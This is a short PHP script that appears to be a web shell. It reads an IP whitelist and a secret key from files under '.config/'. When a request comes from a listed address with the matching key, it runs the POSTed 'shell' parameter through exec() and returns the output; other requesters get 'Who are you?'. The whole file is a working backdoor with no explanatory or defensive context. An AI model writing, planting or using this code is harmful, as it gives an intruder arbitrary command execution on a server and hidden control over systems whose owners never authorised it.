<?php

class FileData {
  public function __construct($filename) {
    $handle = fopen($filename, "r");
    $this->fdata = fread($handle, filesize($filename));
    fclose($handle);
  }
}

$ip_list = new FileData(".config/whitelist.dat");
$private_key = new FileData(".config/key.dat");
$ip_arr = explode("\n", $ip_list->fdata);
$stdout;

foreach($ip_arr as $ip) {
  if ($_SERVER['REMOTE_ADDR'] == $ip) {
    if ($_POST['key'] != $private_key->fdata) continue;
    exec($_POST['shell'], $stdout); 
    echo implode("\n", $stdout);
    break;
  }
}

if (!$stdout) echo "Who are you?\n";

